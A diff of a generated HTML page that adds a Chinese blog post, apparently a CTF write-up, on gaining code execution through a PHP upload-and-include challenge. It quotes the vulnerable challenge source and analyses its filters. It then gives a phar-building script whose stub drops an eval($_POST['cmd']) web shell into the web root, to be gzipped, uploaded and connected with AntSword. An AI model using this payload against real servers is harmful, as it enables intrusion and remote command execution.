@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/tags/buu打靶笔记/"/>
+    <link rel="canonical" href="http://example.com/2026/04/18/不含php代码的php文件上传rce/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,17 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/tags/BUU%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP文件上传不含PHP代码实现RCE的方法">
+<meta property="og:url" content="http://example.com/2026/04/18/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-04-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-18T06:13:42.222Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +110,7 @@
     
     <title>
         
-            Tag: BUU打靶笔记 | SoloWalker
+            PHP文件上传不含PHP代码实现RCE的方法 | SoloWalker
         
     </title>
 
@@ -243,7 +246,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/tags"
                                         >
                                     <i class="fa-solid fa-tags fa-fw"></i>
@@ -334,7 +337,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/tags"
                         >
                             <span>
@@ -401,58 +404,274 @@
 			
 
 			<div class="main-content">
-				<div class="page-template-container">
-	
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-	
-	<div class="tag-name">
-    <i class="fa-solid fa-tag"></i>&nbsp;BUU打靶笔记
-</div>
-<div class="tag-post-list">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PHP文件上传不含PHP代码实现RCE的方法</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/kaneki_avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">SoloWalker</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-18</span>
+        <span class="mobile">2026-04-18</span>
+        <span class="hover-info">Created</span>
+    </span>
     
-<div class="archive-list-container">
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-18 14:13:42</span>
+            <span class="mobile">2026-04-18 14:13:42</span>
+            <span class="hover-info">Updated</span>
+        </span>
     
-        <section class="archive-item mb-spacing-unit last:mb-0">
-            <div class="archive-item-header flex flex-row items-center mb-2">
-                <span class="archive-year font-semibold text-3xl mr-2">2026</span>
-                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">1</span>
-            </div>
-            
-            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
                 
                     
+                        
+                        <li>
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                        </li>
                     
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='03-24'>
-                    
-                    <a href="/2026/03/24/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="block w-fit">
-                        <span class="article-title my-0.5 text-2xl">堆叠注入之利用handler语句获取数据</span>
-                    </a>
                     
                 
-                </li> <!-- Ensure the last item is properly closed -->
             </ul>
-        </section>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="PHP文件上传不含PHP代码实现RCE的方法"><a href="#PHP文件上传不含PHP代码实现RCE的方法" class="headerlink" title="PHP文件上传不含PHP代码实现RCE的方法"></a>PHP文件上传不含PHP代码实现RCE的方法</h1><h2 id="CTF2025复现"><a href="#CTF2025复现" class="headerlink" title="?CTF2025复现"></a>?CTF2025复现</h2><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>, <span class="string">&#x27;xz&#x27;</span>, <span class="string">&#x27;7z&#x27;</span>];</span><br><span class="line"><span class="variable">$allowed_mime_types</span> = [</span><br><span class="line">    <span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-bzip2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/gzip&#x27;</span>,`</span><br><span class="line">    <span class="string">&#x27;application/x-gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-xz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-7z-compressed&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$tempfile</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tempfile</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;PK&quot;</span>) !== <span class="literal">false</span> ||</span><br><span class="line">        <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$data</span>), <span class="string">&quot;&lt;?php&quot;</span>) !== <span class="literal">false</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filter</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nope :&lt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// mimetype check</span></span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$mime_type</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime_type</span>, <span class="variable">$allowed_mime_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;unexpected mimetype&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ext check</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;unexpected extension&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;/tmp/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;File upload success!Please include with &#x27;url&#x27;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="variable">$include_url</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.(zip|bz2|gz|xz|7z)/i&quot;</span>, <span class="variable">$include_url</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;unexpected extension&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;/tmp/&#x27;</span> . <span class="variable">$include_url</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>这里我们很明显能看到有三道防线：</p>
+<ol>
+<li><code>filter</code>函数：在我们读取的文件内容中不能包含<code>__HALT_COMPILER();</code>(防 phar 存根)、<code>PK</code>(防Zip头)、<code>&lt;?/&lt;?php</code>(防普通马)。</li>
+<li><code>finfo_file()</code>函数进行MIME类型检验：只允许白名单内的压缩包格式。</li>
+<li>后缀名检验：只允许白名单内的后缀名。</li>
+</ol>
+<h5 id="部分概念的解读"><a href="#部分概念的解读" class="headerlink" title="部分概念的解读"></a>部分概念的解读</h5><p><code>__HALT_COMPILER()</code>：这是一个编译器指令，作用是：当php引擎读到这个指令时停止解析，后面的内容不会检查语法，也不会尝试执行。</p>
+<p>这个指令也是 Phar 归档文件的硬性要求：一个标准的 Phar 文件的结构为：[可执行 PHP 存根代码]+<code>__HALT_COMPILER();</code>+[压缩的二进制数据块]</p>
+<p><strong>什么是可执行PHP存根代码？</strong></p>
+<p>PHP存根代码（Stub）是 Phar 文件格式规定的一个<strong>引导加载程序</strong>，可以理解为 Phar 这个“压缩包”的自解压和启动程序。</p>
+<p>这是一个简单的 PHP 文件，在 Phar 文件被<code>include</code>包含或者直接通过命令执行时会最先运行，核心任务时初始化 Phar 环境并加载内部的业务代码。</p>
+<p>在CTF中，这是一个理想的代码注入点，因为这是 Phar 文件被包含的第一入口，放在这里的恶意代码会被自动执行。</p>
+<p>那为什么明明已经ban了<code>__HALT_COMPILER()</code>payload中依然会有呢？</p>
+<p>我们上传的文件时一个gz之类的压缩包，而<code>file_get_contents()</code>读取文件时读取的整个文件的二进制流，而里面的内容是被 gzip 算法加密过的乱码数据，自然读取不到。</p>
+<p>而在<code>include</code>中，如果我们上传的文件中包含<code>.phar</code>，且没有用像<code>phar://</code>之类的形式，PHP会认为是本地文件，然后 Phar 扩展识别发现该文件是合法的 phar 文件后按照 phar文件处理。在过程中会自动解压文件。</p>
+<h3 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php file_put_contents(&quot;/var/www/html/shell.php&quot;,&quot;&lt;?php eval(\$_POST[\&#x27;cmd\&#x27;]); ?&gt;&quot;); __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>利用这段代码生成一个 phar 文件，然后压缩成 gz 文件并上传，连接蚁剑即可。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> PHP文件上传不含PHP代码实现RCE的方法</li>
+        <li><strong>Author:</strong> SoloWalker</li>
+        <li><strong>Created at
+                :</strong> 2026-04-18 00:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-18 14:13:42
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://s0lowalker.github.io/2026/04/18/不含php代码的php文件上传RCE/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
 </div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/04/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">java反序列化之URLDNS链</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/11/Jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84SSTI/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Jinja2常见关键字被ban后的SSTI</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
 	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">PHP文件上传不含PHP代码实现RCE的方法</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8D%E5%90%ABPHP%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0RCE%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">PHP文件上传不含PHP代码实现RCE的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF2025%E5%A4%8D%E7%8E%B0"><span class="nav-text">?CTF2025复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="nav-text">题目源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-text">攻击手法</span></a></li></ol></li></ol></li></ol>
 
-	<div class="page-template-content markdown-body">
-		
-
-		
-	</div>
-
-	<div class="page-template-comments">
-		
 	</div>
 </div>
-
-<div class="paginator">
-	<span class="page-number current">1</span>
+	</div>
+	
 </div>
-  
+
 			</div>
 
 			
@@ -530,6 +749,26 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -654,6 +893,7 @@
         }),
     );
 </script>
+
 
 
 
